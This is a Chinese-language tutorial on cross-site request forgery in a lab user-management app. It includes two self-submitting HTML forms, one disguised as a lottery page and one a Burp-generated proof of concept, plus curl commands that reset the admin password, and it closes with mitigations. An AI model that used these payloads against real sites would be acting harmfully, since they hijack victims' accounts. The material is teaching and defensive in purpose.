🛡️ CSRF 跨站请求伪造（Cross-Site Request Forgery）

1️⃣ 什么是CSRF？

CSRF（跨站请求伪造）是一种攻击方式，攻击者诱导已登录的用户点击恶意链接或访问恶意页面，在用户不知情的情况下，以用户的身份执行非本意的操作。

2️⃣ CSRF攻击三要素

要素说明
用户已登录目标站点用户的浏览器中存有有效的Session Cookie
目标站点存在CSRF漏洞敏感操作仅依赖Cookie验证，无额外Token校验
用户访问恶意页面攻击者诱导用户点击链接或加载图片

3️⃣ 攻击链示例（本应用）

Step 1: admin用户登录了用户管理系统（有有效Session Cookie）
Step 2: 攻击者构造恶意HTML页面，发给admin
Step 3: admin打开页面，浏览器自动发送POST请求
Step 4: admin的密码被改为攻击者设定的值

恶意页面代码（csrf_attack.html）：
<html>
<body>
<h1>免费抽奖！点击领取</h1>
<form id="csrf" action="http://target:5000/change-password" method="POST">
  <input type="hidden" name="username" value="admin">
  <input type="hidden" name="new_password" value="hacked123">
</form>
<script>document.getElementById('csrf').submit();</script>
</body>
</html>

4️⃣ 用curl模拟CSRF攻击

# 实验1：获得登录后的Cookie，构造恶意请求
# 先获取有效Session
curl -c /tmp/cookies.txt -X POST http://target:5000/login \
  -d "username=alice&password=alice2025"

# 然后利用Cookie修改admin密码（越权+CSRF）
curl -b /tmp/cookies.txt -X POST http://target:5000/change-password \
  -d "username=admin&new_password=evil123"

# 现在可以用 admin/evil123 登录了！

5️⃣ 实验场景一：发布恶意文章

# 攻击者发布含恶意链接的文章
# 管理员点击后触发CSRF请求
# Cookie被利用获取管理员权限
# 实现：无账号密码登录管理员账户

6️⃣ 实验场景二：Burp Suite生成CSRF PoC

Step 1: Burp Suite拦截POST /change-password请求
Step 2: 右键 → Engagement tools → Generate CSRF PoC
Step 3: Burp自动生成恶意HTML代码
Step 4: 保存为HTML文件，在受害者浏览器中打开
Step 5: 受害者的密码被无感知修改

Burp生成的CSRF PoC示例：
<html>
<body>
<form action="http://target:5000/change-password" method="POST">
  <input type="hidden" name="username" value="admin">
  <input type="hidden" name="new_password" value="attacker123">
  <input type="submit" value="Submit">
</form>
<script>document.forms[0].submit();</script>
</body>
</html>

7️⃣ 修复方案

  • ✅ CSRF Token — 每个表单生成唯一Token，提交时验证
  • ✅ 验证Referer — 检查请求来源是否为本站点
  • ✅ 验证原密码 — 修改密码时必须提供原密码
  • ✅ Session绑定 — 禁止修改他人的密码
  • ✅ SameSite Cookie — 设置Cookie的SameSite属性为Strict
